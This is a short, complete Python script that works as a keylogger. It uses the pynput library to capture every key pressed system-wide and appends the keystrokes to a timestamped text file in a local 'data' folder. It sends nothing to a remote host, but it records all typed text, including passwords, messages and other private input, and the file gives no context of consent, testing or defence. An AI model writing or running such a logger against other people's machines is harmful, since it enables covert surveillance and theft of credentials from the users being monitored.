#!/usr/bin/env python3
import os
from datetime import datetime
import pynput
from pynput.keyboard import Key, Listener

# Directory to store logs
if not os.path.exists("data"):
    os.makedirs("data")

LOG_FILE = "data/" + str(datetime.today().strftime("%Y-%m-%d-%H:%M:%S")) + ".txt"


def on_press(key):
    with open(LOG_FILE, "a") as log:
        key = str(key).replace("'", "")
        if key == "Key.space":
            key = " "
        elif key == "Key.enter":
            key = "\n"
        elif key == "Key.shift":
            key = ""
        elif key == "Key.backspace":
            key = " [Backspace] "
        elif key == "Key.esc":
            key = " [Escape] "
        log.write(key)


with Listener(on_press=on_press) as listener:
    listener.join()
